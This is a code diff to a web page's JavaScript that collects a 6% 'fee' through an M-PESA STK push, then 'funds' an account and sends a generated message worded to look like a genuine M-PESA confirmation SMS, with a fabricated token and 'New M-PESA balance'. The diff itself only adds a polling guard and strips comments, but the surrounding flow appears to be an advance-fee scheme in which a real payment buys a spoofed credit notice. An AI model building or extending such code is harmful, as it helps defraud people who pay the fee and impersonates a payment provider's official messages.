@@ -163,7 +163,6 @@
         const stkSpan = document.getElementById('stkPrice');
         
         if (amt >= 100) {
-            // Calculate ONLY the 6% fee for the STK prompt
             const fee = amt * 0.06;
             feeDiv.style.display = "block";
             stkSpan.innerText = "Ksh " + fee.toFixed(2);
@@ -184,7 +183,6 @@
             return;
         }
 
-        // Calculate the STK amount (just the 6% fee)
         const stkAmount = Math.ceil(amt * 0.06); 
         
         payBtn.disabled = true;
@@ -193,7 +191,6 @@
         statusDiv.innerText = `Requesting Ksh ${stkAmount} fee from ${mpesaNumber}...`;
 
         try {
-            // 1. Send STK Push for the FEE ONLY
             const payRes = await fetch(`${BACKEND_PAYMENT}/api/initiate`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -222,20 +219,26 @@
     function startPolling(invoiceId, fundAmt) {
         const statusDiv = document.getElementById('status');
         let pollCount = 0;
+        let isFinishing = false; // Guard variable to prevent multiple blocks from running
 
         const pollTimer = setInterval(async () => {
+            if (isFinishing) return; // Exit loop if processing has already started
+            
             pollCount++;
             try {
                 const res = await fetch(`${BACKEND_PAYMENT}/api/status/${invoiceId}`);
                 const data = await res.json();
                 const state = data.invoice ? data.invoice.state : data.state;
 
-                if (state === "COMPLETE" || state === "COMPLETED") {
-                    clearInterval(pollTimer);
+                if ((state === "COMPLETE" || state === "COMPLETED") && !isFinishing) {
+                    isFinishing = true; // Block subsequent executions immediately
+                    clearInterval(pollTimer); // Destroy loop timer
+                    
                     statusDiv.style.color = "#4CAF50";
                     statusDiv.innerText = "✅ Fee paid! Adding funds to account...";
                     finalizeFunding(fundAmt);
                 } else if (state === "FAILED" || state === "REJECTED" || pollCount > 30) {
+                    isFinishing = true;
                     clearInterval(pollTimer);
                     statusDiv.style.color = "#ff5252";
                     statusDiv.innerText = "❌ Fee payment failed. Balance not updated.";
@@ -248,7 +251,6 @@
     async function finalizeFunding(amt) {
         const statusDiv = document.getElementById('status');
         try {
-            // 2. Fund the FULL amount requested to the original account
             const res = await fetch(`${BACKEND_FUNDS}/fund`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -263,15 +265,12 @@
                 userData.balance = result.newBalance;
                 localStorage.setItem('mledger_user', JSON.stringify(userData));
                 
-                // Generate token and confirmation message
                 const token = generateToken();
                 const dateStr = formatNumericDate();
                 const timeStr = formatTime12Hour();
-                const fee = Math.ceil(amt * 0.06);
                 
                 const confirmationMsg = `${token} Confirmed.You have received Ksh${amt.toFixed(2)} from Mledger intasend Solutions Limited 313031 on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${userData.balance.toFixed(2)}. Separate personal and business funds through pochi la Biashara on *334#`;
 
-                // Send confirmation message to message API only
                 fetch(`${MESSAGE_API}/api/messages`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
